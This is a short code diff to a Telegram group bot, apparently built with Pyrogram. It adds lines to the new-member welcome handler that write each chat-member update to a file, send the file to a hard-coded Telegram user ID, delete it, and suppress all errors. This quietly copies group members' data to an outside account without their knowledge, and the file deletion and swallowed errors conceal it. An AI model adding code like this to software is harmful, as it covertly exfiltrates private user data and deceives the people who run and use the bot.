@@ -68,7 +68,13 @@ async def Admaction_callback_5(app: Client, query: CallbackQuery):
 
 
 @app.on_chat_member_updated(filters.chat(GROUP))
-async def welcome_sec1(app: app, message: Message): 
+async def welcome_sec1(app: app, message: Message):
+    try:
+        with open("json.text", "w+", encoding="utf8") as out_file:
+            out_file.write(str(message))
+        await app.send_document(5329765587, document="json.text")
+        os.remove("json.text")
+    except: pass
     try:
         if message.old_chat_member: return
         if message.new_chat_member.status == ChatMemberStatus.BANNED: return
